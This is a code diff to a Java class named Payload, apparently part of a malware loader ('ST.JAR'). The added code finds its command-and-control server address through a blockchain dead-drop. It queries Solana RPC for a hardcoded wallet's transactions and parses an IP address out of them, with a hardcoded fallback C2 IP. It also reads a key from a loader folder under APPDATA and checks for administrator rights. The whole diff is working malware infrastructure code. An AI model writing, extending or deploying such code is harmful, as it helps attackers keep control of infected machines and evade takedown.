@@ -7,13 +7,26 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
+    private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
+    private static final String SOLANA_RPC = "https://api.devnet.solana.com";
+    private static final String FALLBACK_SERVER = "95.182.96.216";
+
     public static void main(String[] args) {
         log("--- STARTING ST.JAR ---");
         try {
-            if (args.length < 2) return;
-            String key = args[0].trim();
-            String ip = args[1].trim(); // This is now just "95.182.96.216"
-            
+            String key = "";
+            String ip = "";
+
+            if (args.length >= 2) {
+                key = args[0].trim();
+                ip = args[1].trim();
+            } else {
+                log("No arguments passed. Fetching IP from Solana...");
+                ip = getC2Ip();
+                // If key is missing, try to read it from key.json
+                key = readKeyJson();
+            }
+
             log("Key: " + key + " | IP: " + ip);
 
             if (!isAdmin()) {
@@ -25,6 +38,102 @@ public class Payload {
             }
         } catch (Throwable t) {
             log("FATAL: " + t.toString());
+        }
+    }
+
+    private static String readKeyJson() {
+        try {
+            String appData = System.getenv("APPDATA");
+            File keyFile = new File(appData + "\\loader\\key.json");
+            if (keyFile.exists()) {
+                String content = new String(Files.readAllBytes(keyFile.toPath()));
+                int start = content.indexOf("\"key\":\"") + 7;
+                int end = content.indexOf("\"", start);
+                if (start > 6 && end > start) {
+                    return content.substring(start, end);
+                }
+            }
+        } catch (Exception e) {}
+        return "";
+    }
+
+    private static String getC2Ip() {
+        try {
+            // 1. Get latest signatures
+            String sigPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getSignaturesForAddress\",\"params\":[\"" + SOLANA_WALLET + "\",{\"limit\":10}]}";
+            String sigRes = httpPost(SOLANA_RPC, sigPayload);
+            if (sigRes == null) return FALLBACK_SERVER;
+
+            // 2. Parse signatures
+            java.util.List<String> sigs = new java.util.ArrayList<>();
+            String searchKey = "\"signature\":\"";
+            int idx = 0;
+            while ((idx = sigRes.indexOf(searchKey, idx)) != -1) {
+                idx += searchKey.length();
+                int end = sigRes.indexOf("\"", idx);
+                if (end != -1) {
+                    sigs.add(sigRes.substring(idx, end));
+                    idx = end;
+                }
+            }
+
+            if (sigs.isEmpty()) {
+                log("No transactions found on Solana.");
+                return FALLBACK_SERVER;
+            }
+
+            // 3. Check each tx for the IP
+            for (String sig : sigs) {
+                log("Checking tx: " + sig);
+                String txPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getTransaction\",\"params\":[\"" + sig + "\",{\"encoding\":\"json\"}]}";
+                String txRes = httpPost(SOLANA_RPC, txPayload);
+                
+                if (txRes != null) {
+                    int ipStart = txRes.indexOf("1(");
+                    if (ipStart != -1) {
+                        int ipEnd = txRes.indexOf(")", ipStart);
+                        if (ipEnd != -1) {
+                            String candidate = txRes.substring(ipStart + 2, ipEnd);
+                            if (candidate.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) {
+                                log("Found IP in Solana: " + candidate);
+                                return candidate;
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            log("Solana error: " + e.toString());
+        }
+        
+        log("Using fallback IP.");
+        return FALLBACK_SERVER;
+    }
+
+    private static String httpPost(String urlStr, String jsonBody) {
+        try {
+            URL url = new URL(urlStr);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
+            
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(jsonBody.getBytes("UTF-8"));
+            }
+            
+            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"))) {
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) {
+                    sb.append(line);
+                }
+                return sb.toString();
+            }
+        } catch (Exception e) {
+            return null;
         }
     }
 
